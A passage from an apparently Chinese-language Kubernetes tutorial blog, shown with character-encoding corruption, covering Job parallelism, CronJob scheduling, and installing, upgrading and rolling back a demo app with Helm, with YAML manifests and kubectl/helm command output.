æŒ‡çš„æ˜¯å¹¶å‘æ‰§è¡Œæœ€å¤§æ•°é‡ï¼Œä¾‹å¦‚ä¸‹é¢å°±ä¼šå…ˆåˆ›å»º 3 ä¸ª pod å¹¶å‘æ‰§è¡Œä»»åŠ¡ï¼Œä¸€æ—¦æŸä¸ª pod æ‰§è¡Œå®Œæˆï¼Œå°±ä¼šå†åˆ›å»ºæ–°çš„ pod æ¥æ‰§è¡Œï¼Œç›´åˆ° 5 ä¸ª pod æ‰§è¡Œå®Œæˆï¼ŒJob æ‰ä¼šè¢«æ ‡è®°ä¸ºå®Œæˆã€‚</p><p><code>restartPolicy = &quot;OnFailure</code> çš„å«ä¹‰å’Œ Pod ç”Ÿå‘½å‘¨æœŸç›¸å…³ï¼ŒPod ä¸­çš„å®¹å™¨å¯èƒ½å› ä¸ºé€€å‡ºæ—¶è¿”å›å€¼éé›¶ï¼Œ æˆ–è€…å®¹å™¨å› ä¸ºè¶…å‡ºå†…å­˜çº¦æŸè€Œè¢«æ€æ­»ç­‰ç­‰ã€‚ å¦‚æœå‘ç”Ÿè¿™ç±»äº‹ä»¶ï¼Œå¹¶ä¸” <code>.spec.template.spec.restartPolicy = &quot;OnFailure&quot;</code>ï¼Œ Pod åˆ™ç»§ç»­ç•™åœ¨å½“å‰èŠ‚ç‚¹ï¼Œä½†å®¹å™¨ä¼šè¢«é‡æ–°è¿è¡Œã€‚å› æ­¤ï¼Œä½ çš„ç¨‹åºéœ€è¦èƒ½å¤Ÿå¤„ç†åœ¨æœ¬åœ°è¢«é‡å¯çš„æƒ…å†µï¼Œæˆ–è€…è¦è®¾ç½® <code>.spec.template.spec.restartPolicy = &quot;Never&quot;</code>ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">batch/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Job</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hello-job</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">parallelism:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">completions:</span> <span class="hljs-number">5</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">restartPolicy:</span> <span class="hljs-string">OnFailure</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">echo</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">busybox</span><br>          <span class="hljs-attr">command:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br>          <span class="hljs-attr">args:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;-c&quot;</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;for i in 9 8 7 6 5 4 3 2 1 ; do echo $i ; done&quot;</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¸‹é¢çš„å‘½ä»¤åˆ›å»º jobï¼Œå¯ä»¥é€šè¿‡ <code>kubectl get pods -w</code> æ¥è§‚å¯Ÿ job åˆ›å»º pod çš„è¿‡ç¨‹å’Œç»“æœã€‚æœ€åå¯ä»¥é€šè¿‡ <code>logs</code> å‘½ä»¤æŸ¥çœ‹æ—¥å¿—ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hello-job.yaml<br><br>kubectl get jobs                  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME        COMPLETIONS   DURATION   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job   5/5           19s        83s</span><br><br>kubectl get pods                      <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS      RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-5gjjr                     0/1     Completed   0          34s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-8ffmn                     0/1     Completed   0          26s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-ltsvm                     0/1     Completed   0          34s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-mttwv                     0/1     Completed   0          29s</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-job--1-ww2qp                     0/1     Completed   0          34s</span><br><br>kubectl logs -f hello-job--1-5gjjr <br><span class="hljs-meta prompt_"># </span><span class="language-bash">1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">...</span><br></code></pre></td></tr></table></figure><p>Job å®Œæˆæ—¶ä¸ä¼šå†åˆ›å»ºæ–°çš„ Podï¼Œä¸è¿‡å·²æœ‰çš„ Pod <a href="https://kubernetes.io/docs/concepts/workloads/controllers/job/#pod-backoff-failure-policy">é€šå¸¸</a>ä¹Ÿä¸ä¼šè¢«åˆ é™¤ã€‚ ä¿ç•™è¿™äº› Pod ä½¿å¾—ä½ å¯ä»¥æŸ¥çœ‹å·²å®Œæˆçš„ Pod çš„æ—¥å¿—è¾“å‡ºï¼Œä»¥ä¾¿æ£€æŸ¥é”™è¯¯ã€è­¦å‘Šæˆ–è€…å…¶å®ƒè¯Šæ–­æ€§è¾“å‡ºã€‚ å¯ä»¥ä½¿ç”¨ <code>kubectl</code> æ¥åˆ é™¤ Jobï¼ˆä¾‹å¦‚ <code>kubectl delete -f hello-job.yaml</code>)ã€‚å½“ä½¿ç”¨ <code>kubectl</code> æ¥åˆ é™¤ Job æ—¶ï¼Œè¯¥ Job æ‰€åˆ›å»ºçš„ Pod ä¹Ÿä¼šè¢«åˆ é™¤ã€‚</p><h2 id="CronJob"><a href="#CronJob" class="headerlink" title="CronJob"></a>CronJob</h2><p><em>CronJob</em> å¯ä»¥ç†è§£ä¸ºå®šæ—¶ä»»åŠ¡ï¼Œåˆ›å»ºåŸºäº Cron æ—¶é—´è°ƒåº¦çš„ <a href="https://kubernetes.ion/docs/concepts/workloads/controllers/job/">Jobs</a>ã€‚</p><blockquote><p>CronJob ç”¨äºæ‰§è¡Œå‘¨æœŸæ€§çš„åŠ¨ä½œï¼Œä¾‹å¦‚å¤‡ä»½ã€æŠ¥å‘Šç”Ÿæˆç­‰ã€‚ è¿™äº›ä»»åŠ¡ä¸­çš„æ¯ä¸€ä¸ªéƒ½åº”è¯¥é…ç½®ä¸ºå‘¨æœŸæ€§é‡å¤çš„ï¼ˆä¾‹å¦‚ï¼šæ¯å¤©&#x2F;æ¯å‘¨&#x2F;æ¯æœˆä¸€æ¬¡ï¼‰ï¼› ä½ å¯ä»¥å®šä¹‰ä»»åŠ¡å¼€å§‹æ‰§è¡Œçš„æ—¶é—´é—´éš”ã€‚</p></blockquote><p>Cron æ—¶é—´è¡¨è¯­æ³•</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs md"><span class="hljs-section"># â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ åˆ†é’Ÿ (0 - 59)</span><br><span class="hljs-section"># â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ å°æ—¶ (0 - 23)</span><br><span class="hljs-section"># â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ æœˆçš„æŸå¤© (1 - 31)</span><br><span class="hljs-section"># â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ æœˆä»½ (1 - 12)</span><br><span class="hljs-section"># â”‚ â”‚ â”‚ â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ å‘¨çš„æŸå¤© (0 - 6)ï¼ˆå‘¨æ—¥åˆ°å‘¨ä¸€ï¼›åœ¨æŸäº›ç³»ç»Ÿä¸Šï¼Œ7 ä¹Ÿæ˜¯æ˜ŸæœŸæ—¥ï¼‰</span><br><span class="hljs-section"># â”‚ â”‚ â”‚ â”‚ â”‚                          æˆ–è€…æ˜¯ sunï¼Œmonï¼Œtueï¼Œwebï¼Œthuï¼Œfriï¼Œsat</span><br><span class="hljs-section"># â”‚ â”‚ â”‚ â”‚ â”‚</span><br><span class="hljs-section"># â”‚ â”‚ â”‚ â”‚ â”‚</span><br><span class="hljs-section"># * * * * <span class="hljs-emphasis">*</span></span><br></code></pre></td></tr></table></figure><p>ç”¨æ³•é™¤äº†éœ€è¦åŠ ä¸Š cron è¡¨è¾¾å¼ä¹‹å¤–ï¼Œå…¶ä½™åŸºæœ¬å’Œ Job ä¿æŒä¸€è‡´ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">batch/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">CronJob</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hello-cronjob</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">schedule:</span> <span class="hljs-string">&quot;* * * * *&quot;</span> <span class="hljs-comment"># Every minute</span><br>  <span class="hljs-attr">jobTemplate:</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">template:</span><br>        <span class="hljs-attr">spec:</span><br>          <span class="hljs-attr">restartPolicy:</span> <span class="hljs-string">OnFailure</span><br>          <span class="hljs-attr">containers:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">echo</span><br>              <span class="hljs-attr">image:</span> <span class="hljs-string">busybox</span><br>              <span class="hljs-attr">command:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br>              <span class="hljs-attr">args:</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;-c&quot;</span><br>                <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;for i in 9 8 7 6 5 4 3 2 1 ; do echo $i ; done&quot;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤å’Œ Job ä¹ŸåŸºæœ¬ä¿æŒä¸€è‡´ï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f hello-cronjob.yaml<br><span class="hljs-meta prompt_"># </span><span class="language-bash">cronjob.batch/hello-cronjob created</span><br><br>kubectl get cronjob                <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME            SCHEDULE    SUSPEND   ACTIVE   LAST SCHEDULE   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-cronjob   * * * * *   False     0        &lt;none&gt;          8s</span><br><br>kubectl get pods   <br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS      RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-cronjob-27694609--1-2nmdx        0/1     Completed   0          15s</span><br></code></pre></td></tr></table></figure><h1 id="Helm"><a href="#Helm" class="headerlink" title="Helm"></a>Helm</h1><p>2025å¹´4æœˆ11æ—¥ Â· 2311 å­—</p><p>ç»è¿‡å‰é¢çš„æ•™ç¨‹ï¼Œæƒ³å¿…ä½ å·²ç»å¯¹ kubernetes çš„ä½¿ç”¨æœ‰äº†ä¸€å®šçš„ç†è§£ã€‚ä½†æ˜¯ä¸çŸ¥é“ä½ æ˜¯å¦æƒ³è¿‡è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬å‰é¢æ•™ç¨‹ä¸­æåˆ°çš„æ‰€æœ‰èµ„æºï¼ŒåŒ…æ‹¬ç”¨ <code>pod</code>, <code>deployment</code>, <code>service</code>, <code>ingress</code>, <code>configmap</code>,<code>secret</code> æ‰€æœ‰èµ„æºæ¥éƒ¨ç½²ä¸€å¥—å®Œæ•´çš„ <code>hellok8s</code> æœåŠ¡çš„è¯ï¼Œéš¾é“éœ€è¦ä¸€ä¸ªä¸€ä¸ªçš„ <code>kubectl apply -f</code> æ¥åˆ›å»ºå—ï¼Ÿå¦‚æœæ¢ä¸€ä¸ª namespaceï¼Œæˆ–è€…è¯´æ¢ä¸€å¥— kubernetes é›†ç¾¤éƒ¨ç½²çš„è¯ï¼Œåˆè¦é‡å¤æ€§çš„æ“ä½œåˆ›å»ºçš„è¿‡ç¨‹å—ï¼Ÿ</p><p>æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨æ“ä½œç³»ç»Ÿæ—¶ï¼Œéœ€è¦å®‰è£…ä¸€ä¸ªåº”ç”¨çš„è¯ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ <code>apt</code> æˆ–è€… <code>brew</code> æ¥ç›´æ¥å®‰è£…ï¼Œè€Œä¸éœ€è¦å…³å¿ƒè¿™ä¸ªåº”ç”¨éœ€è¦å“ªäº›ä¾èµ–ï¼Œå“ªäº›é…ç½®ã€‚åœ¨ä½¿ç”¨ kubernetes å®‰è£…åº”ç”¨æœåŠ¡ <code>hellok8s</code> æ—¶ï¼Œæˆ‘ä»¬è‡ªç„¶ä¹Ÿå¸Œæœ›èƒ½å¤Ÿä¸€ä¸ªå‘½ä»¤å°±å®‰è£…å®Œæˆï¼Œè€Œæä¾›è¿™ä¸ªèƒ½åŠ›çš„ï¼Œå°±æ˜¯ CNCF çš„æ¯•ä¸šé¡¹ç›® <a href="https://github.com/helm/helm">Helm</a>ã€‚</p><blockquote><p>Helm å¸®åŠ©æ‚¨ç®¡ç† Kubernetes åº”ç”¨â€”â€” Helm Chartï¼ŒHelm æ˜¯æŸ¥æ‰¾ã€åˆ†äº«å’Œä½¿ç”¨è½¯ä»¶æ„å»º <a href="https://kubernetes.io/">Kubernetes</a> çš„æœ€ä¼˜æ–¹å¼ã€‚</p><p>å¤æ‚æ€§ç®¡ç† â€”â€”å³ä½¿æ˜¯æœ€å¤æ‚çš„åº”ç”¨ï¼ŒHelm Chart ä¾ç„¶å¯ä»¥æè¿°ï¼Œ æä¾›ä½¿ç”¨å•ç‚¹æˆæƒçš„å¯é‡å¤å®‰è£…åº”ç”¨ç¨‹åºã€‚</p><p>æ˜“äºå‡çº§ â€”â€”éšæ—¶éšåœ°å‡çº§å’Œè‡ªå®šä¹‰çš„é’©å­æ¶ˆé™¤æ‚¨å‡çº§çš„ç—›è‹¦ã€‚</p><p>åˆ†å‘ç®€å• â€”â€” Helm Chart å¾ˆå®¹æ˜“åœ¨å…¬å…±æˆ–ç§æœ‰åŒ–æœåŠ¡å™¨ä¸Šå‘ç‰ˆï¼Œåˆ†å‘å’Œéƒ¨ç½²ç«™ç‚¹ã€‚</p><p>å›æ»š â€”â€” ä½¿ç”¨ <code>helm rollback</code> å¯ä»¥è½»æ¾å›æ»šåˆ°ä¹‹å‰çš„å‘å¸ƒç‰ˆæœ¬ã€‚</p></blockquote><p>æˆ‘ä»¬é€šè¿‡ brew æ¥å®‰è£… helmã€‚æ›´å¤šæ–¹å¼å¯ä»¥å‚è€ƒ<a href="https://helm.sh/zh/docs/intro/install/">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install helm<br></code></pre></td></tr></table></figure><p>Helm çš„ä½¿ç”¨æ–¹å¼å¯ä»¥è§£é‡Šä¸ºï¼šHelm å®‰è£… <em>charts</em> åˆ° Kubernetes é›†ç¾¤ä¸­ï¼Œæ¯æ¬¡å®‰è£…éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ <em>release</em>ã€‚ä½ å¯ä»¥åœ¨ Helm çš„ chart <em>repositories</em> ä¸­å¯»æ‰¾æ–°çš„ chartã€‚</p><h2 id="ç”¨-helm-å®‰è£…-hellok8s"><a href="#ç”¨-helm-å®‰è£…-hellok8s" class="headerlink" title="ç”¨ helm å®‰è£… hellok8s"></a>ç”¨ helm å®‰è£… hellok8s</h2><p>å¼€å§‹æœ¬èŠ‚æ•™ç¨‹å‰ï¼Œæˆ‘ä»¬å…ˆæŠŠä¹‹å‰æ‰‹åŠ¨åˆ›å»ºçš„ hellok8s ç›¸å…³çš„èµ„æºåˆ é™¤(é˜²æ­¢ä½¿ç”¨ helm åˆ›å»ºåŒåçš„ k8s èµ„æºå¤±è´¥)ã€‚</p><p>åœ¨å°è¯•è‡ªå·±åˆ›å»º hellok8s helm chart ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ¥ç†Ÿæ‚‰ä¸€ä¸‹æ€ä¹ˆä½¿ç”¨ helm chartã€‚åœ¨è¿™é‡Œæˆ‘å…ˆåˆ›å»ºå¥½äº†ä¸€ä¸ª hellok8sï¼ˆåŒ…æ‹¬ä¼šåˆ›å»º deployment, service, ingress, configmaps, secretï¼‰çš„ helm chartã€‚é€šè¿‡ GitHub actions ç”Ÿæˆæ”¾åœ¨äº† <a href="https://github.com/guangzhengli/k8s-tutorials/tree/gh-pages/">gh-pages</a> åˆ†æ”¯ä¸‹çš„ <code>index.yaml</code> æ–‡ä»¶ä¸­ã€‚</p><p>æ¥ç€å¯ä»¥ä½¿ç”¨ä¸‹é¢å‘½ä»¤è¿›è¡Œå¿«é€Ÿå®‰è£…ï¼Œå…¶ä¸­ <code>helm repo add</code> è¡¨ç¤ºå°†æˆ‘åˆ›å»ºå¥½çš„ hellok8s chart æ·»åŠ åˆ°è‡ªå·±æœ¬åœ°çš„ä»“åº“å½“ä¸­ï¼Œ<code>helm install</code> è¡¨ç¤ºä»ä»“åº“ä¸­å®‰è£… hellok8s&#x2F;hello-helm åˆ° k8s é›†ç¾¤å½“ä¸­ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">helm repo add hellok8s https://guangzhengli.github.io/k8s-tutorials/<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-string">&quot;hellok8s&quot;</span> has been added to your repositories</span><br><br>helm install my-hello-helm hellok8s/hello-helm --version 0.1.0<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME: my-hello-helm</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAMESPACE: default</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">STATUS: deployed</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">REVISION: 1</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºå®Œæˆåï¼Œé€šè¿‡ <code>kubectl get</code> ç­‰å‘½ä»¤å¯ä»¥çœ‹åˆ°æ‰€æœ‰ hellok8s èµ„æºéƒ½åˆ›å»ºæˆåŠŸï¼Œ<code>helm</code> ä¸€æ¡å‘½ä»¤å³å¯åšåˆ°ä¹‹å‰æ•™ç¨‹ä¸­æ‰€æœ‰èµ„æºçš„åˆ›å»ºï¼é€šè¿‡ <code>curl</code> k8s é›†ç¾¤çš„ ingress åœ°å€ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°è¿”å›å­—ç¬¦ä¸²ï¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl get pods<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                  READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f88f984c6-k8hpz   1/1     Running   0          15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f88f984c6-nzwg6   1/1     Running   0          15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-f88f984c6-s89s7   1/1     Running   0          15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment-d47fd7f66-6w76b      1/1     Running   0          15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment-d47fd7f66-tsqj5      1/1     Running   0          15h</span><br><br>kubectl get deployments<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                  READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment   3/3     3            3           15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx-deployment      2/2     2            2           15h</span><br><br>kubectl get service<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">kubernetes                   ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP    13d</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">service-hellok8s-clusterip   ClusterIP   10.107.198.175   &lt;none&gt;        3000/TCP   15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">service-nginx-clusterip      ClusterIP   10.100.144.49    &lt;none&gt;        4000/TCP   15h</span><br><br>kubectl get ingress<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME               CLASS   HOSTS   ADDRESS     PORTS   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-ingress   nginx   *       localhost   80      15h</span><br><br>kubectl get configmap<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME               DATA   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-config    1      15h</span><br><br>kubectl get secret<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                  TYPE                                  DATA   AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-secret                       Opaque                                1      15h</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">sh.helm.release.v1.my-hello-helm.v1   helm.sh/release.v1</span><br><br>curl http://192.168.59.100/hello<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v6] Hello, Helm! Message from helm values: It works with Helm Values[v2]!, From namespace: default, From host: hellok8s-deployment-598bbd6884-ttk78, Get Database Connect URL: http://DB_ADDRESS_DEFAULT, Database Connect Password: db_password</span><br></code></pre></td></tr></table></figure><h2 id="åˆ›å»º-helm-charts"><a href="#åˆ›å»º-helm-charts" class="headerlink" title="åˆ›å»º helm charts"></a>åˆ›å»º helm charts</h2><p>è¿™æ®µä»£ç æ— æ³•æ¸²æŸ“ï¼Œè¯·æŸ¥çœ‹ï¼š<a href="https://github.com/guangzhengli/k8s-tutorials#helm">https://github.com/guangzhengli/k8s-tutorials#helm</a></p><h2 id="rollback"><a href="#rollback" class="headerlink" title="rollback"></a>rollback</h2><p>Helm ä¹Ÿæä¾›äº† Rollback çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬å…ˆä¿®æ”¹ä¸€ä¸‹ <code>message: &quot;It works with Helm Values[v2]!&quot;</code> åŠ ä¸Š [v2]ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">application:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">hellok8s:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">guangzhengli/hellok8s:v6</span><br>    <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>    <span class="hljs-attr">message:</span> <span class="hljs-string">&quot;It works with Helm Values[v2]!&quot;</span><br>    <span class="hljs-attr">database:</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://DB_ADDRESS_DEFAULT&quot;</span><br>      <span class="hljs-attr">password:</span> <span class="hljs-string">&quot;db_password&quot;</span><br>  <span class="hljs-attr">nginx:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">replicas:</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>å†æ‰§è¡Œ <code>helm upgrade</code> å‘½ä»¤æ›´æ–° k8s èµ„æºï¼Œé€šè¿‡ <code>curl http://192.168.59.100/hello</code> å¯ä»¥çœ‹åˆ°èµ„æºå·²ç»æ›´æ–°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">âœ  hello-helm git:(main) âœ— helm upgrade --install hello-helm --values values.yaml .<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Release <span class="hljs-string">&quot;hello-helm&quot;</span> has been upgraded. Happy Helming!</span><br>NAME: hello-helm<br>NAMESPACE: default<br>STATUS: deployed<br>REVISION: 2<br><br>curl http://192.168.59.100/hello<br><span class="hljs-meta prompt_"># </span><span class="language-bash">[v6] Hello, Helm! Message from helm values: It works with Helm Values[v2]!, From namespace: default, From host: hellok8s-deployment-598bbd6884-4b9bw, Get Database Connect URL: http://DB_ADDRESS_DEFAULT, Database Connect Password: db_password</span><br></code></pre></td></tr></table></figure><p>å¦‚æœè¿™ä¸€æ¬¡æ›´æ–°æœ‰é—®é¢˜çš„è¯ï¼Œå¯ä»¥é€šè¿‡ <code>helm rollback</code> å¿«é€Ÿå›æ»šã€‚é€šè¿‡ä¸‹é¢å‘½ä»¤çœ‹åˆ°ï¼Œå’Œ deployment çš„ rollback ä¸€æ ·ï¼Œå›æ»šå REVISION ç‰ˆæœ¬éƒ½ä¼šå¢å¤§åˆ° 3 è€Œä¸æ˜¯å›æ»šåˆ° 1ï¼Œå›æ»šåä½¿ç”¨ <code>curl</code> å‘½ä»¤è¿”å›çš„ v1 ç‰ˆæœ¬çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">helm ls<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME            NAMESPACE       REVISION          STATUS          CHART                   APP VERSION</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-helm      default         2                 deployed        hello-helm-0.1.0        1.16.0</span> <br><br>helm rollback hello-helm 1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Rollback was a success! Happy Helming!</span><br><br>helm ls<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME            NAMESPACE       REVISION          STATUS          CHART                   APP VERSION</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hello-helm      default         3                 deployed        hello-helm-0.1.0        1.16.0</span> <br><br>curl http://192.168.59.100/hello<br><span class="hljs-meta prompt_"># </span><span 